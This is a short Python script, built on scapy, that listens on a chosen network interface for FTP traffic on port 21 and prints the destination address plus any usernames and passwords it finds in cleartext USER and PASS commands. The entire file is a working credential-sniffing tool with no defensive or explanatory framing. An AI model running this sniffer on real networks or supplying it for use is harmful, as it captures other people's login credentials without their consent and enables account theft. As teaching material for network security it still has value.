#!/usr/bin/env python3
from scapy.all import *
import optparse

def ftpSniff(pkt):

    destination = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    password = re.findall('(?i)PASS (.*)', raw)

    if user:
        print('Detected FTP login to ' + str(destination))
        print('User account: ' + str(user[0].strip('\r\n')))

    elif password:
        print('Password: ' + str(password[0].strip('\r\n')))

def main():

    parser = optparse.OptionParser('Usage of the program: ' + '-i <interface>')
    parser.add_option('-i', dest = 'interface', type = 'string', help = 'Specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print(parser.usage)
        exit(0)
    
    else:
        conf.iface = options.interface

    try:
        sniff(filter = 'tcp port 21', prn = ftpSniff)
    
    except KeyboardInterrupt:
        exit()


main()